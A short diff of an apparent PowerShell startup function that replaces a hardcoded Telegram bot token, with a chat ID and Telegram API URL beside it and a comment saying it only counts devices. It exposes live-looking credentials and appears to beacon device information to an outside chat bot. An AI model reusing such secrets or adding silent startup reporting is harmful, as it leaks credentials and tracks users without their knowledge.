@@ -11,7 +11,7 @@ function Startup {
             )
             try {
                 # This only do Devices count please don't play with it
-                $BotToken = "7140758327:AAG0vc3zBFSJtViny-H0dXAhY5tCac1A9OI"
+                $BotToken = "7140758327:AAF4BeD8wl4xspYvtYu7qwhd0XC82bubI1k"
                 $ChatID = "1299033071"
                 # This only do Devices count please don't play with it
                 $SendMessageUrl = "https://api.telegram.org/bot$BotToken"
